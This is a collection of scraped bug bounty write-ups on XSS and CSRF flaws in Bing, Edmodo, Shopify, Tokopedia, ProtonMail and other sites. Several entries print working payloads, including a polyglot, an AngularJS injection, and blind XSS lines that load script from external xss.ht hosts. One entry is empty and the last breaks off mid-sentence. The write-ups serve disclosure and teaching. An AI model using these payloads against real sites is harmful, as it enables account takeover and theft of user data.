{"source_url": "https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69", "title": "Two vulnerabilities makes an Exploit!! (XSS and CSRF in Bing) | by Sai Krishna Kothapalli | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTwo vulnerabilities makes an Exploit!! (XSS and CSRF in Bing) | by Sai Krishna Kothapalli | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Two vulnerabilities makes an Exploit!! (XSS and CSRF in Bing) Sai Krishna Kothapalli 3 min read · Jun 10, 2016 -- 1 Listen Share Hello !! This post will be about my 4th and 5th valid bug reports I submitted to Microsoft. Open the Images in a new tab if you find them difficult to view. I took the screenshots in a 1080p screen. This time I have found a XSS and CSRF vulnerabilities in Bing . Bing images is testing 3 new features called Stream , Favorites , Trending which are still in beta. Bing Images So I was going through this and there is this option where you can search and directly add images to your favourites. It was cool, So I wanted to take a look at how it is implemented. When you click on the heart symbol after the image search, the image is added to your favourites. and the request looks like this It’s URL-Encoded. Once decoded it looks like this {“WriteNewCollection”:true,”query”:”lucianazogbi”,”mid”:”5689B0BFCDB0E64E595A3B6C2B7A0865A4DC236C”,”description”:”lucianazogbi”,”MediaUrl”:”https://beautifulgeniuses.files.wordpress.com/2015/01/lucianazogbi.jpg&#8221;,”SourceUrl”:”http://beautifulgeniuses.com/2015/01/14/lucianazogbi/&#8221;,”ThWidth”:300,”ThHeight”:300,”MediaWidth”:640,”MediaHeight”:640,”MD5″:”md5_5c6aa5d2768f0d2255dab627015da340″,”MediaFormat”:””,”ThumbnailId”:“OIP.M5c6aa5d2768f0d2255dab627015da340o2″,”CollectionType”:0,”ContentId”:”XGql0naP”} Interesting there is no CSRF token and there is no X-Requested-With : XMLHttpRequest header. Which means it is vulnerable to CSRF attacks. Another interesting thing is the webpage is displaying this data in the Favorites tab. Then why not try to inject some JavaScript there. I tried all the fields but none of them worked. When I almost gave hope I saw this. This link is vulnerable to XSS . It is accepting links javascript:code in the <a> href tag . So when I click on it. BAMN Our favourite popup. So, by sending the user to a single malicious site it is possible to compromise his account. If I have stopped after the CSRF I would have not found the XSS. So, by successfully combining 2 vulnerabilities we made an exploit to compromise Bing. I reported this to Microsoft and now it is fixed. Since, that feature is still in beta-testing they took more than 5 months to fix that in order to make it more secure. My name will be in the March 2016 Hall Of Fame. Thank you for reading. Peace :D Feel free to comment and give some suggestions. Originally published at kmskrishna.wordpress.com on June 10, 2016. Security Microsoft Bug Bounty Bing Hacking -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Sai Krishna Kothapalli 3.3K followers · 435 following Security Researcher | Indian | Alumnus, IIT Guwahati Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@GeneralEG/hack-your-form-new-vector-for-blind-xss-b7a50b808016", "title": "Hack Your Form-New vector for Blind XSS | by Youssef A. Mohamed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@GeneralEG/hack-your-form-new-vector-for-blind-xss-b7a50b808016. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHack Your Form-New vector for Blind XSS | by Youssef A. Mohamed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Hack Your Form-New vector for Blind XSS Youssef A. Mohamed 3 min read · Mar 12, 2019 -- Listen Share H ello Pentesters, I’m Youssef A. Mohamed aka GeneralEG Security Researcher @ CESPPA , Cyber Security Engineer @ Squnity and SRT Member @ Synack Press enter or click to view image in full size Today I’m gonna share a juicy finding with you. Talking about bypassing a couple of filters to execute malicious javascript codes easily and achieve a Blind Stored XSS. “I found this issue in a lot of targets so, I will take one of these programs as an example.” The program is private so let’s call it redacted.com Recently I was testing in this program and after some recon, I found that the website offers a specific service (Create Forms). How does this service work? 1)Creator User create a form 2)Creator User share the link with visitor 3)Visitor fill the form 4)The filled information will be available for the Form’s Creator at redacted.com/manager/{Form ID}/ So while testing the “Creating form” functions, I’ve found that there’s a Website input I made a simple form. Then opened as the form as a visitor. At the first I tried to bypass it as the basic style: (thought that if I wrote website.com?” payload it will execute) So, I entered: https://example.com/?\"%22&#34; ( “ + url encoded + html entities encoded) Then opened the creator account to see what happened. But unfortunately, the filter encoded the double quotes. https://example.com&quot;%22&amp;#34; and noticed that the Link rendered in (a tag) So, I decided to grab a cup of coffee :”D Press enter or click to view image in full size After a few minutes of deep thinking while drinking my coffee about how I will bypass this one. I decided to start fuzzing in this input especially.. {Enter Website} While I’m fuzzing I noticed that the filter accepted test:https://example.com ! then tried javascript:https//evil.com and it worked :D “Evil loud laugh” Now I’m sure that there’s XSS here but it’s need real website merged with my payload so i wrote this one. javascript:x=’http://x.c';alert('xss');// Finally executed! But wait we want to make it Blind XSS to attack the real admins (The best scenario). So the last payload was: javascript:eval(‘a=document.createElement(\\’script\\’);a.src=\\’https://generaleg.xss.ht\\';document.body.appendChild(a)');s='https://s.com' ¯\\_(ツ)_/¯ That’s it! Notes: 80% of my targets which have the Website’s input was vulnerable to the same scenario. To make sure that your target is vulnerable to the same problem you need a few steps to make sure: A. Check if the website is accepting other URI scheme like javascript:https://generaleg0x01.com or not? B. Check if the website is rendering your https://generaleg0x01.com on HTML ‘a’ tag or not? And in the most similar situations, the same payload will work perfectly. Timeline: 20 December, 2018: Report Submitted 25 December, 2018: Report Reviewed and Triaged 30 December, 2018: Report Resolved & 800$ Bounty Awarded Learned lessons: Fuzz as much as you can. Don’t try one technique to bypass the filter to try other techniques. Happy Hacking! Security Blindxss Cesppa Generaleg Bug Bounty -- -- Written by Youssef A. Mohamed 395 followers · 47 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@abaykandotcom/olx-bug-bounty-reflected-xss-adb3095cd525", "title": "OLX Bug Bounty: Reflected XSS. Who would have thought that there was… | by Akbar Kustirama | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@abaykandotcom/olx-bug-bounty-reflected-xss-adb3095cd525. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nOLX Bug Bounty: Reflected XSS. Who would have thought that there was… | by Akbar Kustirama | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in OLX Bug Bounty: Reflected XSS Akbar Kustirama 1 min read · Mar 13, 2019 -- 1 Listen Share Who would have thought that there was even a bug that we could find on page 404 Not Found right? This time I wrote up when I found Reflected XSS on one of the domains in-scope by OLX, sharjah.dubizzle.com . Step to Reproduce Visit https://sharjah.dubizzle.com/property-for-sale/land\" accesskey=\"X\" onclick=alert(1337) codelatte=\"/2018/10/10/commercial-land-for-sale-in-al-sajja-12/ (you can copy and paste). XSS is reflected inside HTML Link tag Press enter or click to view image in full size Press ALT + SHIFT + X in keyboard to trigger XSS payload. Alert will showing up. Press enter or click to view image in full size After the bug was fixed, my name entered on the Security Hall of Fame 😎 Reference https://hackerone.com/reports/504984 (Original Report). https://portswigger.net/blog/xss-in-hidden-input-fields (XSS in hidden input fields). PS: Sorry, maybe there are some irreverent words. It’s semi-google-translate. Hopefully you understand that xD Security Xss Bug Bounty Olx Bugs -- -- 1 Written by Akbar Kustirama 68 followers · 10 following Part-time pangrok, part-time hekermen, full-time pura-pura pinter. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@valakeyur/xss-in-edmodo-within-5-minute-my-first-bug-bounty-889e3da6167d", "title": "XSS in Edmodo within 5 Minute (My First Bug Bounty) | by Keyur Vala | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@valakeyur/xss-in-edmodo-within-5-minute-my-first-bug-bounty-889e3da6167d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS in Edmodo within 5 Minute (My First Bug Bounty) | by Keyur Vala | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS in Edmodo within 5 Minute (My First Bug Bounty) Keyur Vala 4 min read · Mar 4, 2019 -- 4 Listen Share Hello Bug Hunters, What I will tell you in this article is how I managed to exploit the XSS in Edmodo? This bug was found by me a month ago. Inspired the story of Parth Shah . He wrote an article based on Stored XSS . As I was surfing the edmodo.com website, I found two or more URLs at that point in time. There is nothing on that page except a login page and an outdated layout of the Edmodo website. I think let’s see if I can find anything on this page. I decided to capture the login request of that page after some time on Target URL: https://www.edmodo.com/bookmarklet-login When I opened this URL, I saw a login screen with a sky blue background. Here is a screenshot of the login page. However, nothing happened when I tried SQL and XSS Input. My next step was to dig deep into the application and check all parameters of the request after logging in. Press enter or click to view image in full size In the request, username, password, and login information are passed. All of these passes when the user logs in. However, I see there is a parameter called URL passed with the request. Press enter or click to view image in full size My mind goes into overdrive when the URL parameter is passed in the request! Now, I’m gonna try to put a string like “Test Example”. I will show the response and it will be reflected on the page. Inputs do not involve any validation or filtering. I tested other payloads and they were also set correctly. Likewise, the payload is also breaking the input tag on the response side. Special characters and XSS payloads will be accepted without any errors. Step to Generate XSS [Reflected]: Step - 1 : Open https://www.edmodo.com/bookmarklet-login . Enter the random username and password. Press enter or click to view image in full size Step - 2: Note the request. Note the “URL” parameter passing in the request. Press enter or click to view image in full size Step - 3: Put the url= ”/><script>alert(document.domain)</script. Press enter or click to view image in full size Step - 4: Check the response. the payload breaks the input tag on the response side. Press enter or click to view image in full size Step -5: Payload successfully executed Woooohooo…! Press enter or click to view image in full size My reaction after Successfully Executing Payload is like this..:P Finding a single vulnerability can take a lot of time and effort, but if you go too deep, something will definitely be found. I was very excited because it was my first valid bug. I always awaited a response from Edmodo. I immediately made a POC video and sent it to the team. The team was very responsive. The swag was delivered a few weeks later. Press enter or click to view image in full size Timeline: 09-Jan-2019: Report Sent 10-Jan-2019: Report in Verification Process. 10-Jan-2019: Report Verified Successfully. 11-Jan-2019: Reward Sent 20-Jan-2019: Reward Received. (Swag) Things to Know : Always dig deeper into the web application. check every parameter which is passing in the request. Always Never Give Up. There is always something when you go into the deep. Always do more practice reading books and read more and more writeups. Thank you for reading this. Focusing now more on reward-based programs. Any suggestions are welcome. About Me: An IT security consultant and researcher with over 3.5+ years of expertise in Web & Mobile Penetration Testing. Competent and skilled IT & Web Security Researcher & Developer. Apart from professional experience, I have enthusiasm and diligence for hacking, finding new bugs and vulnerabilities. Having work knowledge in reputed fields. Helping Enterprise, Medium, and small businesses to be cyber safe. By providing high-end cyber security consulting and the best possible solutions. Working with a vast cyber security community of consultants, companies, and solution providers to reach the cyber-safe goal. Facebook, Twitter, Linkedin, Medium: @valakeyur Thank You, Keyur Vala Security Infosec Bug Bounty Infosecurity Writeup -- -- 4 Written by Keyur Vala 49 followers · 19 following Cyber Security Enthusiast | Blogger | Entrepreneur | Bug Bounty Hunter Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869", "title": "How I found Blind XSS Vulnerability in redacted.com | by newp_th | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found Blind XSS Vulnerability in redacted.com | by newp_th | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found Blind XSS Vulnerability in redacted.com newp_th 2 min read · Mar 12, 2019 -- 2 Listen Share Today I want to share with you a Blind XSS which I found in private site.In this write-up I will explain how I found Blind XSS and methodologies. Blind XSS is a flavor of cross site scripting (XSS), in which the attacker “blindly” publishes a series of malicious payloads on web pages that are likely to keep them in a constant state (such as in the database or in the log). Press enter or click to view image in full size Currently I use the XSS hunter (Web version) to find out the Blind XSS. XSShunter: XSS Hunter is a recently launched platform that makes pen testing for XSS vulnerabilities much easier to monitor and organize. Through it you can launch all kinds of XSS attacks, but where it really shines is when carrying out a Blind XSS attack. Blind XSS for beginners I get a lot of DM’s in twitter asking questions about Blind XSS like which tool to use, how to register in XSShunter… medium.com Step 1: To create a new rule, as none of the pre-defined ones does what we need, click “Add”, and you’ll see the new rule dialogue appear. Click the “Type” drop-down and click “Request header”. Then, add ^Referer.*$ as the “Match” criteria. This string is a regular expression that matches on any header string that starts with Referer. As there should be only one, if any, then a simple match is all we need. Next, set the “Replace” text as Referer: “><script src= https://newone.xss.ht ></script>. Then, check the “Regex match” checkbox, and click “OK”. Press enter or click to view image in full size Matthew Setter When you're testing web applications, sometimes you want to automatically change some part (or parts) of the request… www.matthewsetter.com Step 2: When the response is intercepted, you will see in “Raw” request, that the Referer: “><script src= https://newone.xss.ht ></script> has been replaced!, as in the image below. Press enter or click to view image in full size Step 3: After few hours, when I went back to XSSHunter, it showed that a blind XSS had been executed. Press enter or click to view image in full size Security Blind Xss Xss Attack Cross Site Scripting Web Application Security -- -- 2 Written by newp_th 321 followers · 269 following secure your computer 😊 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ZishanAdThandar/my-first-stored-xss-on-edmodo-com-540a33349662", "title": "Hunting methodology and experience of my First Stored XSS on Edmodo.com | by ZishanAdThandar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ZishanAdThandar/my-first-stored-xss-on-edmodo-com-540a33349662. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHunting methodology and experience of my First Stored XSS on Edmodo.com | by ZishanAdThandar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Hunting methodology and experience of my First Stored XSS on Edmodo.com ZishanAdThandar 2 min read · Mar 13, 2019 -- 3 Listen Share There are many people sharing images of Edmodo swag. It looks cool and everyone says that, it is cross site scripting bug. So, I assumed there is lots of XSS. Edmodo is a very secure platform and edmodo is very serious about security, so I decided to hunt . Even leet hunter Prial Islam Khan shared image of his edmodo swag, that inspired me a lot. Press enter or click to view image in full size Screenshot from https://prial.me/acknowledgements.html So, I decided to test Edmodo. But, I am a noob. How can I find the bug? yeah, I can. If I can that means anyone can. What is my methodology? Is that simple steps or any l33ty automation tool. Nope, it’s just manual.. too manual. As I said, I am a noob.. so tried very noob way to hunt. I filled all fields with XSS payloads with hope to get an XSS and cool swag ❤. How I got the bug? As I said all fields are filled with XSS. I was hoping for the pop up and got nothing. But, hope (believe) is always there with me. I read Arbaz Hussain ’s ( kiraak-boy ) post, where he advised to give time to all program before loosing hope. Link to the post: https://medium.com/@arbazhussain/10-rules-of-bug-bounty-65082473ab8c So, I decided to start finding bugs on edmodo subdomains. I used a tool named sublist3r (coded by Ahmed Aboul-ela) to find subdomains. Link to the tool: https://github.com/aboul3la/Sublist3r Then? then I just opened beta.edmodo.com and boom XSS popped. I started to find the injection point and it’s on the status post. How I got the payload? May be people are thinking, even some people already asked me about the payload I used.. It’s not mine. I used an XSS polyglot crafted by XSS King Ashar Javed. Here is the payload, \">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">) I used this payload initially then removed unnecessary parts while making PoC video. Twitter Status: Note: This is my first medium post. So, feel free to comment to give advice about this write up and correct me (even grammar mistakes). btw, the bug was found long time ago, so I described methodology from my memory. Experience with Edmodo: Edmodo is very secure platform and very serious about security. I have great experience with edmodo. There response is quick and communication is clear. Thanks edmodo (Specially Chip Benson). Video PoC (also follow my youtube channel for updates): Timeline: XSS Reported 16 September, 2018 Triaged and rewarded on 17 September, 2018 Swag received on 29 September, 2018 About me: Twitter https://twitter.com/ZishanAdThandar Youtube https://youtube.com/c/ZishanAdThandar Security Bug Bounty Ethical Hacking White Hat Hacker Cybersecurity -- -- 3 Written by ZishanAdThandar 91 followers · 218 following https://ZishanAdThandar.github.io Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@modam3r5/reflected-xss-at-https-photos-shopify-com-ea696db3915c", "title": "Reflected XSS at https://photos.shopify.com/ | by Modam3r5 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@modam3r5/reflected-xss-at-https-photos-shopify-com-ea696db3915c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS at https://photos.shopify.com/ | by Modam3r5 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS at https://photos.shopify.com/ Modam3r5 2 min read · Feb 21, 2019 -- 3 Listen Share Hi again ❤, this time i would like to share an XSS bug that i found at Shopify, the bug was relay easy to find if you read the source of the page, so i hope what i would like to share help you to find a bug ^_^. Description : the domain https://photos.shopify.com/ is one of Shopify gallery site to share photos and information about event etc, so the first thing that i did to understand the site shows the source of the page and by looking inside it i notice that every image has a parameter `pid` which contains information about the ID of the image and it’s included at the image TAG. this something good if you trying to find a hidden parameter to test an XSS attack or content injected at the site. so by adding this parameter to the end of the link and put this payload as the value for it javascript:alert(\"modam3r\"). Press enter or click to view image in full size the XSS was run successfully for the first time, I was thinking that this kind of hidden parameter but after doing more search and try a random different parameter, collect that the site accepts any parameter and it returns with the value of it inside the `img` TAG, so any payload will be run successfully as I think. i send the report to Shopify and after one day i got this response Press enter or click to view image in full size so I moved and send the report to pixieset.com team about this, and they fixed the bug without any response to my report or give any bounty ^_^. Results or tips: always look for a hidden parameter, and try to use random parameters that maybe return with something good to you. keep in mind not all report will return with bounty sometimes it’s return with Disappointment. Time Line: 11–02–2018 report send to Shopify . 12–02–2018 team response and closed as Informative. 12–02–2018 report send again to pixieset.com team with full details. 21–02–2019 the bug was fix by pixieset.com without any response from them. @modam3r5 Security -- -- 3 Written by Modam3r5 52 followers · 2 following just another security research [Ly] Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://apapedulimu.click/multiple-stored-xss-on-tokopedia/", "title": "Multiple Stored XSS On Tokopedia – Apapedulimu", "friendly_explanation": "This is a bug bounty writeup from https://apapedulimu.click/multiple-stored-xss-on-tokopedia/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMultiple Stored XSS On Tokopedia – Apapedulimu Skip to content Apapedulimu Personal Blog – Portfolio Menu and widgets Home Contact Me About Me Hall Of Fame Publication Search for: Multiple Stored XSS On Tokopedia So, It’s just old bug who I have been reported around 2018. I’ll share what I found on Tokopedia. Just in case you need some article to go to sleep. But it’ll just short description and PoC Here it is : Stored XSS On Complain Product (Keterangan Bukti Field) This vulnerable perform on feature complain product, When buyer not satisfied with the stuff who has been buy by buyer. Buyer can complain with upload some Image. And the vulnerability is on Description image field. PoC : Go to complain menu Upload some image Input Payload on description of image ( <img src=x onerror=alert(document.domain)> ) Payload will be execute when user navigate to the resolution menu. Video : Stored XSS On Location Shop (m.tokopedia.com ) This vulnerable on Location Shop Parameter at https://m.tokopedia.com/ . So, this bug is just set the location shop to payload. And when someone navigate to the Shop detail. It’ll pop up the XSS. PoC : Open The mobile apps Tokopedia Edit the location of shop to XSS payload ( <img src=x onerror=alert(document.domain)> ) Open the location via browser Video : Stored XSS via AngularJS Injection On Etalase Name Vulnerability exist because Tokopedia install the AngularJs old version and not filtering the illegal character very well. So, I just Insert the payload of AngularJs Injection to Etalasane Name and XSS will be fired up. PoC : Go To Add product Set the Etalase Name to AngularJs Payload ( {{‘a’.constructor.prototype.charAt=[].join;$eval(‘x=1} } };alert(document.domain)//’);}} ) Save, And Open the product Video : Blind XSS on CS System ( Tokocash ) Tokopedia have some CS system, use the salesforce application. And when having some discussion between Tokopedia & Salesforce, the root cause is on the Tokopedia Custom Code. PoC : Login Tokocash.com REquest new ticket with payload of XSS Hunter Wait for execute payload on XSSHunter Dashboard. Actually I have found more Stored XSS, but sadly that’s mark as Duplicate. I just fresh Bug who has been marked as valid only. Thanks! Get in touch with me on Twitter : Apapedulimu Published by apapedulimu Urip Kui Urup View all posts by apapedulimu Posted on February 19, 2019 Author apapedulimu Tags Stored XSS , Tokopedia , XSS Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website Notify me of follow-up comments by email. Notify me of new posts by email. Δ Post navigation Previous Previous post: Clickjacking on Google MyAccount Worth 7,500$ Next Next post: Price Parameter Tampering On Bukalapak Proudly powered by WordPress"}
{"source_url": "https://5alt.me/2019/02/xss-in-azure-devops/", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://5alt.me/2019/02/xss-in-azure-devops/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n"}
{"source_url": "https://medium.com/@futaacmcyber/stored-xss-on-edmodo-11a3fbc6b6d0", "title": "Stored XSS on Edmodo. Hi guys, | by Futaacm Cyber | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@futaacmcyber/stored-xss-on-edmodo-11a3fbc6b6d0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS on Edmodo. Hi guys, | by Futaacm Cyber | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Edmodo Futaacm Cyber 4 min read · Feb 18, 2019 -- 1 Listen Share Hi guys, Today i will be sharing about the exploit i found in Edmodo which could have allowed me to take over the account of any user of my choice. About the target? Edmodo is an educational technology company offering a communication, collaboration, and coaching platform to K-12 schools and teachers. The Edmodo network enables teachers to share content, distribute quizzes, assignments, and manage communication with students, colleagues, and parents. Let’s get started!!! So I saw a post on twitter where some guys posted about the swag they got from edmodo and I decided to try my luck out probably I might be able to find something. Below I will be talking about one of the bug I found on this target. Reconnaissance I visited the website and signed up as a normal user, I tried playing around the application for a while trying to understand the work flow of the application before creating another account which I will be using for attacking. After playing with the application for a while, I thought I understood the application and I was set to attacking it which happened to the biggest lie of all time. Thinking i was set to attack, so I decided to create a new account which I will be using to attack. To sign up on this application, the application takes you through four stages which are: Stage 1: The application ask you for your email and password Stage 2: The application ask you for your first name and last name. (This is the vulnerable endpoint) Stage 3: The application ask you for the school you will be teaching from Stage 4: The application ask you to link your other social media account with your edmodo account. The Exploit In the first stage, I filled in the form as required, i entered my email and password, then I was redirected to the second stage where I was asked for my firstname and lastname, this was where I injected my payload, I used <img src=x onerror=alert(1)> as the firstname and the same as the lastname, luckily for me my payload slipped through without being filtered or rejected by the server, at this stage I was already dancing. my current mood I filled the rest of the forms as required then I got logged in to my account. Upon logging in I was a bit disappointed, I was expecting my payload to be executed in the home page since my first name and last name were reflected their, instead of being executed as a script, they were reflected as a raw text, I checked my profile page probably I might get lucky and my payload will be executed their but still no luck, at this stage I was getting discouraged. me feeling discouraged I tried for couple of days to get it work but damn!!, I got nothing, this is where my insufficient reconnaissance showed but I was determined to make it work, as the infosec community always say #TryHarder which is what I did, on one faithful day, I was playing with the application again then I searched for my Account A from my Account B, I found my other Account A and I sent a connection request from my Account B to my Account A and I logged in to my Account A and I accepted the request, I viewed my Profile, I saw I had a new connection, I clicked on the connection tag and Boom!!! my payload was executed. At this stage I didn’t know how to feel because I have being trying to make this work for days and finally It worked, straight away I reported the bug, I didn’t try exploiting it further because I didn’t want to get a “duplicate report” response and which sadly for me that was what I got. But it’s good, I did learn something from exploiting the application which is: “Reconnaissance is the key” and “Being persistence pays off”. Screenshot of P.O.C: Press enter or click to view image in full size Response from the triage team: Press enter or click to view image in full size That’s all for now, Thank you. Credit: Afolic JavaScript Bug Bounty Xss Attack Stored Xss -- -- 1 Written by Futaacm Cyber 41 followers · 1 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@vladimirmetnew/3-xss-in-protonmail-for-ios-95f8e4b17054", "title": "3 XSS in ProtonMail for iOS. No, these XSSs are not so scary. | by Vladimir Metnew | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vladimirmetnew/3-xss-in-protonmail-for-ios-95f8e4b17054. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n3 XSS in ProtonMail for iOS. No, these XSSs are not so scary. | by Vladimir Metnew | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in 3 XSS in ProtonMail for iOS No, these XSSs are not so scary. Vladimir Metnew 3 min read · Mar 6, 2019 -- 1 Listen Share # I ❤️ DOMPurify DOMPurify is a popular XSS sanitizer by Cure53. cure53/DOMPurify DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure… github.com Any defensive research could be used in offensive purposes. DOMPurify has great XSS tests with descriptions . These tests were sourced from real DOMPurify bypasses . Moreover, DOMPurify prevents XSS in all browsers and is aware of browser-specific behaviors. So, these XSS payloads are good. # XSS Payloads I’ve used XSS payloads from DOMPurify 😃 # XSS Fires in applewebdata: origin on email opening — <svg onload=alert()// 2. Fires on click in applewebdata: origin (🤦‍♀) <a href=\"javascript:alert()\"> 3. Fires in data: origin after loading email’s remote content <embed src=\"data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlByb3Rvbm1haWwgbmVlZHMgeW91ciBwYXNzd29yZCIpPC9zY3JpcHQ+\"></embed> iframe/embed with base64 encoded html payload Need to note, that all 3 XSS are of different categories. Even if I’ve found a 4th XSS, it’d be likely have been considered as a duplicate. # Impact It wasn’t possible to escalate these XSS into RCE/LFI. At least, I didn’t find such a way. JS execution via email is already an issue. Privacy violation: track when the user opens the email, disclose IP, leak other info. Phishing via prompt(), alert() “Useless” UXSS Press enter or click to view image in full size # applewebdata:// origin is useless Initially, I thought that XSSs in applewebdata: should allow reading local files. There was CVE-2016–1764 (XSS in iMessage via javascript: URI) that allows reading local files. applewebdata: was also highlighted in browser security research (UXSS) — https://runic.pl/hitb-ios-browsers.pdf . Local files reading would be pretty impactful for a mail app. However, this flaw was patched in Webkit(?) and now applewebdata: allows only doing UXSS in this particular case. Anyway, UXSS is better than no UXSS, at least some privileged context :( Additionally, Webkit forbids requests to file:// origin. Thanks to Safiler , XSSs in HelpViewer and related researches in this field. Bo0oM/Safiler Safari local file reader. Contribute to Bo0oM/Safiler development by creating an account on GitHub. github.com # Reporting The vulnerabilities were reported on Dec 12. At first, ProtonMail security team reacted quickly, but then they disappeared for a while. There was a small miscommunication on their side. As I understand, they incorrectly estimated impact of these XSSs and somehow missed that 2 XSSs in applewebdata: are pretty impactful. Later, ProtonMail iOS engineer Anatoly (thx!) noticed my tweets and the vulnerabilities were reviewed by ProtonMail team again. # Timeline Dec 11: Reported XSS in applewebdata: origin with no interaction via <svg onload=alert()// Dec 11: Reported XSS via javascript: URI in applewebdata: origin Dec 14: Response from ProtonMail Sec team Dec 25: Found a XSS in data: origin via <embed src=[base64_paylaod]> ` Dec 25: Reminded the security team about findings Dec 29: ProtonMail Sec team replied that these XSSs aren’t so scary, because they don’t allow reading emails Jan 12: Made an accent on the fact that 2 XSS fires in applewebdata: Jan 13: Made a PoC UXSS in applewebdata: to demonstrate that XSS context could be considered as privileged. Jan 14: ProtonMail: no emails reading => not critical. Feb 12–13: Made a few tweets regarding my findings in ProtonMail. Feb 14 ProtonMail replied on Twitter. Feb 15: Andy Yen emailed me via ProtonMail: ProtonMail team made an additional review of reported vulnerabilities + apology for the miscommunication. Feb 15: The vulnerabilities patched in the stable. Feb 27: ProtonMail agreed to disclose the report. # Thanks to … All my Twitter followers 💙 Anatoly from ProtonMail iOS team for noticing my tweets about the issues in ProtonMail 😉 ProtonMail SecTeam for their continuous work on ProtonMail’s security 🚀 and for making this disclosure possible Andy Yen for the personal review of reported vulnerabilities. Such things generally mean that security is taken seriously. 🔜 😈 More disclosures soon. Thanks for reading! Security -- -- 1 Written by Vladimir Metnew 887 followers · 45 following https://github.com/Metnew Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nahoragg/chaining-tricky-oauth-exploitation-to-stored-xss-b67eaea4aabd", "title": "Chaining Tricky OAuth Exploitation To Stored XSS | by Rohan Aggarwal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nahoragg/chaining-tricky-oauth-exploitation-to-stored-xss-b67eaea4aabd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nChaining Tricky OAuth Exploitation To Stored XSS | by Rohan Aggarwal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Chaining Tricky OAuth Exploitation To Stored XSS Rohan Aggarwal 4 min read · Jan 27, 2019 -- 2 Listen Share Press enter or click to view image in full size H ey everyone, hope you all are having a great 2019 so far. I found this cool bug and wanted to share, so here it goes. So after going through a private program on hackerone, i found a Self-XSS[AngularJS Template Injection] and a misconfigured OAuth implementation with low impacts. These 2 bugs alone wouldn’t have a great impact but if chained together, will lead to a Perfect Stored XSS! Let’s call the application redacted.com for obvious reasons. To give a background of redacted.com, it’s file storage service just like Google Drive or DropBox. User can upload, download, share their files from this platform. I found XSS 